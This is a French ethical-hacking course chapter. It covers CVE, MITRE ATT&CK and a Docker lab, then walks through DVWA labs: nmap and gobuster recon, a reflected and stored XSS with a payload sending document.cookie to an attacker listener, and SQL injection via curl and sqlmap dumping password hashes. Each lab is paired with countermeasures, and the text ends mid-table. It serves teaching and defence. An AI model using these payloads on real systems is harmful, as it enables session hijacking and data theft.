# Chapitre 01 : Introduction au hacking éthique et aux vulnérabilités — Techniques de hacking et contre-mesures - Niveau 1

---

## Introduction à la cybersécurité

### Qu'est-ce que la cybersécurité ?

La **cybersécurité** est l'ensemble des pratiques, technologies et processus conçus pour protéger les systèmes, réseaux, programmes et données contre les attaques, les dommages ou les accès non autorisés. Son objectif fondamental repose sur le **triangle CIA** (Confidentialité, Intégrité, Disponibilité).

### Bref historique

| Période | Événement marquant |
|---------|-------------------|
| **1971** | Premier ver informatique : **Creeper** (Bob Thomas, BBN) — expérimental, il traversait ARPANET en affichant "I'm the creeper, catch me if you can!" |
| **1988** | **Morris Worm** — premier ver à se propager massivement (6000 machines infectées, 10% d'Internet à l'époque). Robert Morris Jr. condamné. |
| **1999** | **CVE** (Common Vulnerabilities and Exposures) créé par MITRE — standardisation des identifiants de vulnérabilités |
| **2000s** | Explosion des attaques web (XSS, SQLi). OWASP Top 10 publié en 2003. |
| **2010** | **Stuxnet** — première cyberarme d'État (États-Unis + Israël contre les centrifugeuses iraniennes) |
| **2013** | **Target** — vol de 40M de cartes bancaires via un compte tiers non sécurisé (climatisation) |
| **2017** | **WannaCry** — ransomware mondial via EternalBlue (CVE-2017-0144), 300 000 machines dans 150 pays |
| **2020+** | Généralisation du **Zero Trust**, explosion des ransomwares (Colonial Pipeline 2021), IA générative dans les attaques (phishing ultra-personnalisé, code malveillant automatisé) |

### Pourquoi ce cours ?

Le hacking éthique (ou pentest) consiste à **attaquer un système avec autorisation** pour en identifier les failles avant qu'un véritable attaquant ne les exploite. Ce cours vous donne les bases : outils, méthodologie, reporting.

Vous apprendrez à :
- Utiliser les outils du pentest (nmap, sqlmap, Metasploit, Hydra)
- Comprendre et exploiter les 4 vulnérabilités web les plus critiques
- Cartographier vos attaques avec le framework MITRE ATT&CK
- Documenter vos résultats dans un rapport professionnel

---

## Objectifs pédagogiques

- Mettre en place l'environnement de lab (Docker, Kali, outils)
- Comprendre le référentiel MITRE ATT&CK et naviguer dans sa matrice
- Distinguer les profils d'attaquants
- Cartographier les attaques (phishing, DDoS, SQLi, XSS) aux techniques ATT&CK
- Prendre en main nmap, Metasploit, Wireshark
- Exploiter les 4 failles web sur DVWA : Reflected XSS, Stored XSS, CSRF, SQLi, Command Injection

---

# Partie 1 — Mise en place de l'environnement (1h30)

## A.1 Vérification des outils Kali

```bash
# Vérification des versions installées des outils essentiels du pentest
# which = localise le chemin d'un exécutable dans le PATH (permet de vérifier qu'un outil est bien installé)
python3 --version     # → Python 3.10+  (interpréteur requis par sqlmap, scripts d'exploit)
docker --version      # → Docker 24+  (moteur de conteneurisation pour les cibles du lab)
nmap --version        # → Nmap 7.94  (scanner réseau standard)
msfconsole --version  # → Metasploit 6.3  (framework d'exploitation)
sqlmap --version      # → sqlmap 1.7  (outil automatisé d'injection SQL)
which nc              # → /usr/bin/nc  (netcat : connexions TCP/UDP, reverse shells)
```

Si un outil manque :
```bash
# sudo = exécute la commande suivante avec les privilèges root (super-utilisateur)
# apt update = rafraîchit la liste des paquets disponibles ; apt install -y = installe les paquets sans demande de confirmation
sudo apt update && sudo apt install -y docker.io docker-compose-v2 git nmap metasploit-framework sqlmap netcat-openbsd curl
# usermod -aG = modifie le compte utilisateur pour l'ajouter (-a) au groupe (-G) docker
# Permet d'utiliser docker sans taper sudo à chaque commande
sudo usermod -aG docker $USER  # -aG = append to Group (préserve les groupes existants)
# Important : fermer ET rouvrir la session (logout/login) pour que le groupe soit pris en compte
# Un simple "su - $USER" ou une nouvelle fenêtre de terminal suffit, pas besoin de rebooter
```

## A.2 Arborescence de travail

```bash
# git clone = télécharge une copie complète du dépôt Git distant dans le dossier courant
git clone https://github.com/yugmerabtene/techniques-de-hacking-niveau-1.git
cd techniques-de-hacking-niveau-1
```

Une fois le dépôt cloné, voici l'arborescence **réelle** :

```text
techniques-de-hacking-niveau-1/      # Dépôt du cours (RACINE)
├── labs_resolution/                 # 🔥 Labs RÉSOLUS (correction, référence)
│   ├── jour-01/                     #   Scripts XSS, SQLi, CMDi, hash cracking
│   ├── jour-02/                     #   Recon nmap, exploits vsftpd/Samba, MITM (incl. recon/)
│   ├── jour-03/                     #   BOF pwntools, WAF bypass, Trojan
│   ├── jour-04/                     #   Hardening + ELK SOC
│   └── jour-05/                     #   Forensique + generate_report.py
├── rendu_labs/                      # 📁 Votre dossier de rendu (à créer / compléter)
│   ├── jour-01/                     #   → Déposez vos travaux J1 ici
│   ├── jour-02/                     #   → Déposez vos travaux J2 ici
│   ├── jour-03/                     #   → Déposez vos travaux J3 ici
│   ├── jour-04/                     #   → Déposez vos travaux J4 ici
│   └── jour-05/                     #   → Déposez vos travaux J5 ici
├── env.sh                           # Variables centralisées (sourcer avant chaque lab)
├── docker-compose.yml               # 7 conteneurs cibles
├── docker/                          # Dockerfiles (buffovf, forensic, sqli-app, waf, secure-linux)
├── img/                             # Schémas et figures
├── JOUR-01*.md → JOUR-05*.md       # Supports de cours
├── PLAN_SCHEMAS.md
├── README.md
└── extra/                           # Projets complémentaires
    ├── HORS-SERIE-AGENTIC.md
    └── hors-serie/                  # Dockerfile + code source KillChainAgent
```

## A.3 Lancement des conteneurs

```bash
# docker compose up = démarre tous les services définis dans docker-compose.yml
# -d (detached) = arrière-plan, --build = reconstruit les images Docker avant de lancer
# Sans argument : tous les conteneurs ; avec un nom : un seul service (ex: dvwa)
docker compose up -d --build
```

```mermaid
flowchart TB
    KALI["Kali Linux — hôte<br/>nmap · msfconsole · sqlmap · curl · nc"]
    DVWA["dvwa-target :8088<br/>XSS · CSRF · SQLi · CMDi"]
    SQLI["sqli-app-target :8083<br/>SQLi · hash cracking"]
    VSFTPD["vsftpd-target :21, :445<br/>FTP · SMB · MySQL"]
    BOF["buffovf-target :9001<br/>Buffer overflow"]
    WAF["waf-target :8081<br/>App derrière ModSecurity"]
    SECLINUX["secure-linux-target :2224<br/>À durcir"]
    FORENSIC["forensic-victim :8082<br/>Command injection"]
    KALI -->|"localhost:8088"| DVWA
    KALI -->|"localhost:8083"| SQLI
    KALI -->|"localhost:21"| VSFTPD
    KALI -->|"localhost:9001"| BOF
    KALI -->|"localhost:8081"| WAF
    KALI -->|"localhost:2224"| SECLINUX
    KALI -->|"localhost:8082"| FORENSIC
```

**Fig 1** — Topologie du lab : 7 conteneurs cibles exposés sur ports dédiés, orchestrés par Kali Linux hôte.

---

# Partie 2 — Introduction au hacking éthique (4h30)

---

## Introduction

Toute démarche de sécurité commence par la compréhension du paysage des menaces. Avant de lancer un scan ou d'exploiter une faille, il faut un **langage commun** pour décrire les comportements adverses. Ce langage, c'est **MITRE ATT&CK** — le standard adopté par les SOC, les CERT et les pentesters.

Ce chapitre couvre la matrice ATT&CK (14 tactiques, 200+ techniques), le mapping des attaques classiques vers leurs IDs, et l'exploitation des 4 vulnérabilités web les plus répandues.

> **Sources :** [MITRE ATT&CK Framework](https://attack.mitre.org/)

---

## 1. MITRE ATT&CK — La matrice des TTPs

**Tactique** = l'objectif (pourquoi). **Technique** = la méthode (comment). **Procédure** = l'implémentation spécifique d'un groupe.

![MITRE ATT&CK v15 — Chaîne complète des 14 tactiques](img/mitre-attack-chain.png)

**Fig 2** — Chaîne complète MITRE ATT&CK v15 : 14 tactiques de la Reconnaissance à l'Impact.

### Correspondance attaques → techniques ATT&CK

![Correspondance attaques et techniques ATT&CK](img/stage%20tactic%20for%20mittre%20atack.webp)

**Fig 3** — Mapping des attaques classiques (Phishing, DDoS, SQLi, XSS, CSRF) vers leurs techniques et tactiques MITRE ATT&CK.

---

## 2. CVE — Common Vulnerabilities and Exposures

### Qu'est-ce qu'une CVE ?

Une **CVE** (Common Vulnerabilities and Exposures) est un identifiant unique et standardisé qui référence une vulnérabilité de sécurité connue dans un logiciel ou un matériel. Créé par la **MITRE Corporation** en **1999**, le système CVE est aujourd'hui le référencement mondial des failles de cybersécurité.

> En 1999, seules **541 CVE** avaient été publiées. En 2025, on dépasse les **240 000 CVE** — une croissance qui illustre l'explosion de la surface d'attaque numérique.

### Format d'une CVE

```
CVE-YYYY-NNNNN
```

| Partie | Signification | Exemple |
|--------|--------------|---------|
| `CVE` | Préfixe fixe (Common Vulnerabilities and Exposures) | CVE |
| `YYYY` | Année de découverte ou de publication | 2017 |
| `NNNNN` | Numéro séquentiel (4+ chiffres, sans zéro devant) | 0144 |

Exemples :
- **CVE-2017-0144** → EternalBlue (buffer overflow SMB, utilisé par WannaCry)
- **CVE-2011-2523** → vsftpd 2.3.4 (backdoor, vu au J2)
- **CVE-2007-2447** → Samba 3.0.20 (usermap script, vu au J2)
- **CVE-2021-44228** → Log4Shell (RCE dans Log4j, score CVSS 10.0)

### Comment une CVE est-elle créée ?

```mermaid
flowchart LR
    A["Chercheur<br/>découvre une faille"] --> B["Signale à l'éditeur<br/>(Microsoft, Apache, ...)"]
    B --> C["Éditeur = CNA<br/>CVE Numbering Authority"]
    C --> D["Assigne un ID<br/>CVE-YYYY-NNNNN"]
    D --> E["Publication<br/>sur cve.org + NVD"]
    E --> F["Correctif<br/>Patch + advisory"]
```

**Fig 4** — Cycle de vie d'une CVE : découverte → signalement → assignation → publication → correctif.

Le réseau des **CNA** (CVE Numbering Authority) est organisé par MITRE :
- **Root CNA** : MITRE elle-même (gère le programme)
- **Éditeurs majeurs** : Microsoft, Oracle, Google, Apache, Red Hat, etc.
- **Chercheurs indépendants** : peuvent passer par un CNA ou un éditeur pour obtenir un ID

> Sans CVE, une vulnérabilité n'a pas d'identité officielle. Impossible de la tracer, de prioriser son correctif, ou de la référencer dans les outils de sécurité (Nessus, OpenVAS, Wazuh).

### Bases de données CVE

| Base | Opérateur | Particularité |
|------|-----------|---------------|
| [cve.org](https://www.cve.org/) | MITRE | Référence officielle |
| [NVD](https://nvd.nist.gov/) | NIST | Ajoute le score **CVSS** + la sévérité |
| [Exploit-DB](https://www.exploit-db.com/) | OffSec | Code d'exploitation fonctionnel |
| [VulDB](https://vuldb.com/) | VulDB | Score propriétaire + trending |
| [CVE Details](https://www.cvedetails.com/) | Independants | Statistiques par éditeur/produit |

### Lien CVE → MITRE ATT&CK

La **CVE** identifie *la vulnérabilité technique* (le trou). La **technique ATT&CK** décrit *la méthode pour l'exploiter* (la manœuvre). Les deux sont inséparables :

| CVE | Vulnérabilité | Technique ATT&CK | Lab |
|-----|---------------|------------------|-----|
| CVE-2011-2523 | vsftpd 2.3.4 — backdoor (supply chain) | [T1190](https://attack.mitre.org/techniques/T1190/) Exploit Public-Facing App | J2 Lab 2.2 |
| CVE-2007-2447 | Samba 3.0.20 — command injection (usermap) | [T1210](https://attack.mitre.org/techniques/T1210/) Exploit Remote Services | J2 Lab 2.3 |
| CVE-2017-0144 | EternalBlue — buffer overflow SMB | [T1210](https://attack.mitre.org/techniques/T1210/) Exploit Remote Services | J2 Lab 2.2 |
| *(aucune)* | XSS, SQLi, CSRF, CMDi (vulnérabilités génériques) | [T1189](https://attack.mitre.org/techniques/T1189/), [T1190](https://attack.mitre.org/techniques/T1190/), [T1203](https://attack.mitre.org/techniques/T1203/), [T1059.004](https://attack.mitre.org/techniques/T1059/004/) | J1 Labs 1.2-1.5 |

> **Note :** Les failles web (XSS, SQLi) n'ont pas de CVE unique car elles dépendent de l'implémentation. En revanche, les vulnérabilités logicielles (vsftpd, Samba) ont une CVE bien spécifique qui permet de les tracer et de les corriger via un système de patch management (M1051).

---

## 3. Profils d'attaquants

```mermaid
flowchart LR
    A["Types de Hackers"] --> B["White Hat : Pentester, autorisé"]
    A --> C["Black Hat : Criminel, financier"]
    A --> D["Grey Hat : Zone grise"]
    A --> E["Hacktiviste : Politique"]
    A --> F["APT : Étatique — APT29, Lazarus"]
```

**Fig 5** — Taxonomie des profils d'attaquants : White Hat, Black Hat, Grey Hat, Hacktiviste, APT.

---

## Lab 1.0 — Conception : Plan d'attaque MITRE ATT&CK

### Fiche

| Durée | Conteneur | Dossier | Outils | ATT&CK |
|---|---|---|---|---|
| 30 min | Aucun (bac à sable) | `rendu_labs/jour-01/` | [ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/) | [TA0043](https://attack.mitre.org/tactics/TA0043/) → [TA0005](https://attack.mitre.org/tactics/TA0005/) |

### Contexte métier

Avant de lancer le moindre outil, un pentest professionnel commence par un **plan d'attaque**. Le client veut savoir : quelles techniques allez-vous utiliser ? dans quel ordre ? avec quel risque ? La matrice MITRE ATT&CK est le langage commun pour répondre à ces trois questions.

Un bon plan = une feuille de route qui couvre la **reconnaissance**, l'**exploitation**, la **post-exploitation** et la **défense**. C'est ce cadre que vous allez construire dans ce lab.

### Étape 1 — Cartographier les cibles

```bash
mkdir -p rendu_labs/jour-01 && cd rendu_labs/jour-01
# Lister les conteneurs cibles disponibles
docker compose ps --services
```

Notez les services exposés par chaque conteneur (ports, protocoles). Vous utiliserez cette information pour choisir vos techniques d'attaque.

### Étape 2 — Créer une couche ATT&CK complète

Ouvrez [ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/) → **New Layer** → **Enterprise v15**.

Créez une couche nommée `Plan JOUR-01` qui couvre les techniques suivantes, organisées par tactique :

| Tactique | Technique | Outil prévu | Lab cible |
|----------|-----------|-------------|-----------|
| [TA0043](https://attack.mitre.org/tactics/TA0043/) Reconnaissance | [T1046](https://attack.mitre.org/techniques/T1046/) Network Service Scanning | nmap | 1.1 |
| [TA0043](https://attack.mitre.org/tactics/TA0043/) Reconnaissance | [T1040](https://attack.mitre.org/techniques/T1040/) Network Sniffing | Wireshark / tcpdump | 1.2 |
| [TA0001](https://attack.mitre.org/tactics/TA0001/) Initial Access | [T1189](https://attack.mitre.org/techniques/T1189/) Drive-by Compromise (XSS) | navigateur, curl | 1.2 |
| [TA0001](https://attack.mitre.org/tactics/TA0001/) Initial Access | [T1190](https://attack.mitre.org/techniques/T1190/) Exploit Public-Facing Application (SQLi) | sqlmap | 1.3, 1.5 |
| [TA0001](https://attack.mitre.org/tactics/TA0001/) Initial Access | [T1203](https://attack.mitre.org/techniques/T1203/) Exploitation for Client Execution (CSRF) | curl, HTML | 1.2 |
| [TA0002](https://attack.mitre.org/tactics/TA0002/) Execution | [T1059.004](https://attack.mitre.org/techniques/T1059/004/) Unix Shell (CMDi) | netcat, msfvenom | 1.4 |
| [TA0006](https://attack.mitre.org/tactics/TA0006/) Credential Access | [T1110](https://attack.mitre.org/techniques/T1110/) Brute Force | Hydra | 1.6 |
| [TA0006](https://attack.mitre.org/tactics/TA0006/) Credential Access | [T1110.001](https://attack.mitre.org/techniques/T1110/001/) Password Cracking | John the Ripper | 1.5 |

**Consigne :** Ajoutez chaque technique dans le Navigator, coloriez en **rouge** les techniques que vous allez exécuter aujourd'hui, en **orange** celles qui dépendent d'une autre, et exportez en JSON → `rendu_labs/jour-01/plan-attaque-j1.json`.

### Étape 3 — Ordonnancer l'attaque

Pour chaque technique du plan, définissez :
1. **Dépendance** : quelle technique doit réussir avant ?
2. **Contre-mesure possible** : qu'est-ce qui pourrait nous bloquer ?
3. **Objectif** : quel résultat attendu (shell, credentials, data) ?

| Ordre | Technique | Dépend de | Risque | Objectif |
|-------|-----------|-----------|--------|----------|
| 1 | T1046 — Scan | — | Firewall bloque le port | Ports ouverts identifiés |
| 2 | T1190 — SQLi | T1046 | WAF détecte union select | Dump de la base users |
| 3 | T1189 — XSS | T1046 | CSP bloque le script | Vol de cookie admin |
| 4 | T1059.004 — CMDi | T1046 | disable_functions coupe nc | Reverse shell |
| 5 | T1110 — Brute Force | T1046 | Account lockout après 3 fails | Mot de passe admin |

Documentez ce tableau dans `rendu_labs/jour-01/plan-attaque-j1.md`.

### Étape 4 — Lancer l'infrastructure

```bash
# Démarrer tous les conteneurs du JOUR-01
cd /chemin/vers/techniques-de-hacking-niveau-1
source env.sh
docker compose up -d --build dvwa sqli-app
```

Vérifiez que les cibles répondent :

```bash
curl -s -o /dev/null -w "%{http_code}" http://localhost:8088/login.php
# → 200  (DVWA est prêt)
curl -s -o /dev/null -w "%{http_code}" http://localhost:8083
# → 200  (sqli-app est prêt)
```

### Checkpoints

- [ ] Couche ATT&CK Navigator créée et exportée en JSON (5+ techniques)
- [ ] Tableau d'ordonnancement rédigé (ordre, dépendance, risque, objectif)
- [ ] Conteneurs dvwa et sqli-app démarrés, réponses HTTP 200
- [ ] Couche défense `defense-j1.json` créée avec les 5 mitigations
- [ ] Chaque technique rouge liée à sa mitigation verte dans Navigator
- [ ] Plan déposé dans `rendu_labs/jour-01/`

### 🔒 Contre-mesure — Couche défense ATT&CK

Un bon plan d'attaque sert aussi à la **défense** : chaque technique a sa mitigation. Vous allez maintenant créer une seconde couche ATT&CK Navigator dédiée aux contre-mesures.

#### Étape 5 — Créer la couche défense

```bash
cd rendu_labs/jour-01
# Ouvrir ATT&CK Navigator dans le navigateur
firefox https://mitre-attack.github.io/attack-navigator/
```

1. **New Layer** → **Enterprise v15** → nommez-la `Defense JOUR-01`
2. **Mode MITIGATIONS** : dans le menu déroulant en haut à gauche, passez de "Techniques" à **"Mitigations"**
3. Ajoutez les 5 mitigations correspondant à chaque technique de votre plan :

| Technique | Mitigation | Code couleur |
|-----------|------------|-------------|
| T1046 — Scan | [M1031](https://attack.mitre.org/mitigations/M1031/) Network Intrusion Prevention | 🟢 Vert (Snort/Suricata bloque les scans) |
| T1190 — SQLi | [M1041](https://attack.mitre.org/mitigations/M1041/) WAF + Requêtes préparées | 🟢 Vert (ModSecurity bloque les injections) |
| T1189 — XSS | [M1013](https://attack.mitre.org/mitigations/M1013/) Application Hardening | 🟢 Vert (CSP, htmlspecialchars) |
| T1059.004 — CMDi | [M1018](https://attack.mitre.org/mitigations/M1018/) User Account Control | 🟢 Vert (disable_functions coupe nc) |
| T1110 — Brute Force | [M1036](https://attack.mitre.org/mitigations/M1036/) Account Lockout | 🟢 Vert (3 tentatives → blocage 15 min) |

#### Étape 6 — Associer attaque → défense

Dans la couche `plan-attaque-j1.json` (chargée dans Navigator) :
1. Sélectionnez chaque technique rouge
2. **Associez** sa mitigation : clic droit → **Link to Mitigation** → cherchez le nom de la mitigation
3. Colorez la technique en **orange** si la mitigation est partielle, **rouge** si aucune mitigation n'est appliquée

```bash
# Exporter la couche défense
# Dans Navigator : Download as JSON → defense-j1.json
# Vérifier le fichier
ls -la defense-j1.json
# → defense-j1.json  (fichier JSON valide, ~5-10 KB)
```

#### Étape 7 — Visualiser le plan complet

Le résultat attendu dans ATT&CK Navigator doit montrer :

```
┌─────────────────────────────────────────────────┐
│ Plan JOUR-01 (attack)          Defense (mitigations) │
│ ┌─────┬─────┬─────┬─────┐     ┌─────┬─────┐      │
│ │T1046│T1190│T1189│T1059│     │M1031│M1041│      │
│ │ 🔴  │ 🔴  │ 🔴  │ 🔴  │     │ 🟢  │ 🟢  │      │
│ └─────┴─────┴─────┴─────┘     └─────┴─────┘      │
│ Techniques rouges = attaquées  Mitigations vertes │
└─────────────────────────────────────────────────┘
```

**Principe :** Une technique attaquante (rouge) doit toujours avoir une mitigation associée (verte). Si une technique rouge n'a pas de mitigation verte → c'est un **risque accepté** ou une **découverte** à signaler dans le rapport.

```bash
# Lister les 2 fichiers produits
ls -la rendu_labs/jour-01/*.json
# → plan-attaque-j1.json   (couche attaque, techniques rouges)
# → defense-j1.json        (couche défense, mitigations vertes)
```

---

## Lab 1.1 — Scan et découverte de DVWA

### Fiche

| Durée | Conteneur | Dossier | Outils | ATT&CK |
|---|---|---|---|---|
| 30 min | dvwa (port 8088) | `rendu_labs/jour-01/` | nmap, gobuster, curl | [TA0043](https://attack.mitre.org/tactics/TA0043/) Recon — [T1046](https://attack.mitre.org/techniques/T1046/) Network Scan |

### Contexte métier

Avant tout pentest, on scanne la cible pour cartographier sa surface d'attaque. Un scan nmap + une énumération web (gobuster) sont systématiquement demandés par le client dans le rapport.

### Étape 1 — Scan nmap

```bash
mkdir -p rendu_labs/jour-01 && cd rendu_labs/jour-01
# 📌 Scan nmap du port DVWA : détection de version du service web
# 🔍 -sV = probe les bannières pour identifier la version précise du service
# 🔍 -p 8088 = port cible, tee = affiche la sortie ET la sauvegarde dans un fichier
nmap -sV -p 8088 localhost | tee nmap_dvwa.txt
# → PORT 8088/tcp open http Apache httpd 2.4.X  (service web Apache confirmé)
```

### Étape 2 — Énumération gobuster

```bash
cd rendu_labs/jour-01
# 📌 Énumération des répertoires web cachés avec gobuster
# 🔍 dir = mode scan de répertoires, -u = URL cible, -w = wordlist de noms communs
# 🔍 -q = mode silencieux (masque la bannière), | tee = affiche + sauvegarde
gobuster dir -u http://localhost:8088 \
  -w /usr/share/wordlists/dirb/common.txt -q | tee gobuster_dvwa.txt
# → /login.php (200)        page de connexion accessible
# → /vulnerabilities (301)  répertoire des pages vulnérables
# → /config (301)           répertoire de configuration (potentiellement sensible)
```

### Étape 3 — Connexion DVWA

```bash
# 📌 Connexion à DVWA via le formulaire d'authentification admin/password
# 🔍 -s = silencieux (pas de barre de progression), -c = sauvegarde le cookie dans un fichier
# 🔍 -d = données POST (username=admin&password=password&Login=Login)
# 🔍 grep -o extrait "Welcome" (succès) ou "Login failed" (échec) pour validation
curl -s -c /tmp/dvwa_cookie.txt \
  -d "username=admin&password=password&Login=Login" \
  "http://localhost:8088/login.php" | grep -o "Welcome\|Login failed"
# → Welcome  (authentification réussie, cookie stocké dans /tmp/dvwa_cookie.txt)

# 📌 Définir le niveau de sécurité sur "low" (obligatoire pour les labs)
# Firefox : http://localhost:8088 → DVWA Security → low
# Alternative sans navigateur :
# 🔍 -b = envoie le cookie d'auth, -c = met à jour le fichier avec le nouveau cookie security=low
curl -s -b /tmp/dvwa_cookie.txt -c /tmp/dvwa_cookie.txt \
  -d "security=low&seclev_submit=Submit" \
  "http://localhost:8088/security.php"
# Le cookie jar contient maintenant PHPSESSID + security=low
# Plus besoin d'ouvrir Firefox pour les labs suivants
```

### Checkpoints
- [ ] nmap : port 8088 ouvert, Apache
- [ ] gobuster : /login.php, /vulnerabilities trouvés
- [ ] Connexion DVWA réussie

### 🔒 Contre-mesure (M1031 Network Intrusion Prevention + M1037 Firewall)

La reconnaissance ennemie se contrecarre en **réduisant la surface d'attaque** :

| Mitigation | Action concrète |
|---|---|
| **M1037** Firewall | UFW pour limiter les ports exposés au strict nécessaire (`ufw default deny incoming`) |
| **M1042** Disable Service | Désactiver le directory listing Apache (`Options -Indexes`) |
| **M1031** IDS/IPS | Snort/Suricata pour détecter les patterns de scan nmap et gobuster |

```bash
# Désactiver le directory listing sur Apache DVWA (empêche gobuster d'énumérer les dossiers)
# docker exec = exécute une commande à l'intérieur d'un conteneur déjà en cours d'exécution
# bash -c '...' = lance un nouveau shell bash et exécute la chaîne de commandes entre guillemets
# apache2ctl restart = redémarre le serveur web Apache (pour appliquer les changements de configuration)
docker exec dvwa-target bash -c "echo 'ServerName localhost' >> /etc/apache2/apache2.conf && echo 'Options -Indexes' >> /etc/apache2/conf-enabled/security.conf && apache2ctl restart"
# Vérification : créer un dossier test sans index puis vérifier le 403
docker exec dvwa-target bash -c "mkdir -p /var/www/html/test-empty"
curl -s -o /dev/null -w "%{http_code}" "http://localhost:8088/test-empty/"
# → 403  (le directory listing est désactivé, accès refusé)
# Nettoyage
docker exec dvwa-target bash -c "rm -rf /var/www/html/test-empty"
```

> **📌 À retenir :** On a cartographié DVWA avec nmap (ports ouverts, OS, services) et gobuster (répertoires cachés). Un attaquant fait ça en 2 minutes pour trouver ses points d'entrée ([TA0043](https://attack.mitre.org/tactics/TA0043/) Reconnaissance).  
> **Attendu :** Liste des ports (80, 8088, 3306…) + répertoires découverts (`/config/`, `/setup/`…).  
> **Défense :** Pare-feu (UFW), désactiver le directory listing (`Options -Indexes`), détecter les scans avec un IDS (Snort/Suricata).

---

## Lab 1.2 — Exploitation XSS

### Fiche

| Durée | Conteneur | Technique ATT&CK |
|---|---|---|
| 30 min | dvwa :8088 | [T1189](https://attack.mitre.org/techniques/T1189/) Drive-by Compromise |

### Contexte technique

Reflected XSS injecte du code dans l'URL, exécuté immédiatement. Stored XSS persiste en base de données. Dans un vrai pentest, on montre les deux car l'impact diffère : Reflected cible un utilisateur, Stored toutes les visites.

### Étape 1 — Reflected XSS

Dans DVWA → **XSS (Reflected)** → champ "What's your name?" :

```html
<script>alert('XSS fonctionnel')</script>
```
→ Popup JavaScript. La faille est confirmée.

### Étape 2 — Vol de cookie

**Terminal 1** — écouteur HTTP :
```bash
cd rendu_labs/jour-01
# Lancement d'un serveur HTTP minimal sur le port 8000 (-m http.server) pour recevoir les cookies exfiltrés via XSS
# Lancement d'un serveur HTTP minimal sur le port 8000 : -m = exécute le module Python http.server intégré
# 8000 = port d'écoute arbitraire ; le serveur affiche chaque requête entrante (URL, IP source, User-Agent)
python3 -m http.server 8000  # Écoute sur toutes les interfaces, affiche chaque requête entrante (GET /?cookie=...)
```

**Terminal 2** — payload dans DVWA (remplacer l'IP par `hostname -I`) :
```html
<script>new Image().src='http://<KALI_IP>:8000/?cookie='+document.cookie</script>
```

L'écouteur reçoit : `GET /?cookie=PHPSESSID=abc123...` → cookie volé.

Retournez dans le **Terminal 1** (écouteur HTTP) pour confirmer.

### Étape 3 — Stored XSS

DVWA → **XSS (Stored)** :
```html
Name: Attaquant
Message: <script>alert('Stored XSS')</script>
```
→ Popup à chaque rafraîchissement. Stocké en base.

### 🔒 Contre-mesure (M1013 Application Hardening + M1054 Secure Coding)

| Attaque | Défense | Code de correction |
|---|---|---|
| Reflected/Stored XSS | **`htmlspecialchars()`** | `htmlspecialchars($input, ENT_QUOTES, 'UTF-8')` neutralise `<`, `>`, `"`, `'` |
| Cookie theft | **Cookie `HttpOnly`** | `session.cookie_httponly = 1` — le cookie n'est plus accessible via `document.cookie` |
| Inline scripts | **CSP Header** | `Content-Security-Policy: script-src 'self'` — bloque tout `<script>` injecté |

```bash
# Activer HttpOnly sur les cookies de session PHP dans DVWA
docker exec dvwa-target bash -c "
  echo 'session.cookie_httponly = 1' >> /etc/php/*/apache2/php.ini
  apache2ctl restart
"
# Vérification : le fichier php.ini contient bien la directive HttpOnly
docker exec dvwa-target bash -c "grep 'session.cookie_httponly' /etc/php/*/apache2/php.ini"
# → session.cookie_httponly = 1  (confirmé)

# Re-tester le vol de cookie via XSS : le payload <script>new Image().src=... ne peut plus lire document.cookie
curl -s -b /tmp/dvwa_cookie.txt \
  "http://localhost:8088/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E" 2>/dev/null \
  | grep -o "&lt;script&gt;\|alert"
# → &lt;script&gt;   (grep -o affiche chaque match sur une ligne séparée)
# → alert         (le HTML est échappé, pas exécuté par le navigateur)
```

> **Checkpoint défensif :** `htmlspecialchars()` + `HttpOnly` neutralisent l'XSS : plus de popup, cookie inaccessible.

> **📌 À retenir :** On a injecté du JavaScript dans une page vulnérable (Reflected XSS + Stored XSS) et volé le cookie de session. L'XSS est la 2e vulnérabilité web la plus courante ([T1189](https://attack.mitre.org/techniques/T1189/)).  
> **Attendu :** Popup `alert(1)` + cookie volé via `document.cookie`.  
> **Défense :** `htmlspecialchars()` pour échapper les entrées, `HttpOnly` sur les cookies pour les rendre inaccessibles au JS.

---

## Lab 1.3 — Injection SQL avec sqlmap

### Fiche

| Durée | Conteneur | Technique ATT&CK |
|---|---|---|
| 30 min | dvwa :8088 | [T1190](https://attack.mitre.org/techniques/T1190/) Exploit Public-Facing App |

### Contexte technique

La requête `SELECT first_name, last_name FROM users WHERE user_id = '$id'` devient `WHERE user_id = '1' OR '1'='1' #'` → retourne tous les utilisateurs. sqlmap automatise l'extraction complète.

### Étape 1 — Test manuel

**Important :** utilisez le cookie jar sauvegardé précédemment dans `/tmp/dvwa_cookie.txt`. Il contient déjà votre PHPSESSID et le niveau `security=low` (définis au Lab 1.1).

```bash
# Test manuel d'injection SQL : -b lit le cookie depuis le fichier jar (PHPSESSID + security=low inclus)
# L'URL contient ' OR '1'='1' # encodé en URL (%27 = ', %20 = espace, %3D = =, %23 = #)
# grep -c compte les occurrences de "First name" → doit retourner 5 (tous les users) au lieu de 1
curl -s -b /tmp/dvwa_cookie.txt \
  "http://localhost:8088/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27+%23&Submit=Submit" \
  | grep -c "First name"
# → 5 (5 utilisateurs affichés au lieu d'1)  (injection SQL confirmée : tous les enregistrements sont retournés)
```

### Étape 2 — sqlmap : dumper les utilisateurs

```bash
cd rendu_labs/jour-01

# sqlmap : --load-cookies = charge les cookies depuis le fichier jar au format Netscape (PHPSESSID + security=low)
# -u = URL cible, -D = base de données cible (dvwa), -T users = table cible
# -C user,password = colonnes à extraire, --dump = affiche le contenu, --batch = mode non-interactif
sqlmap -u "http://localhost:8088/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --load-cookies=/tmp/dvwa_cookie.txt \
  -D dvwa -T users -C user,password --dump --batch
```
Sortie attendue :

```console
+---------+---------------------------------------------+
| user    | password                                    |
+---------+---------------------------------------------+
| admin   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
| gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   |
| 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  |
| pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  |
| smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
+---------+---------------------------------------------+
```

### Checkpoints
- [ ] SQLi manuelle : 5 utilisateurs affichés
- [ ] sqlmap : 5 utilisateurs extraits avec hashs MD5

### 🔒 Contre-mesure (M1013 Application Hardening + M1041 WAF)

L'injection SQL se corrige en **ne concaténant jamais l'entrée utilisateur dans une requête** :

| Vulnérabilité | Correction | Exemple |
|---|---|---|
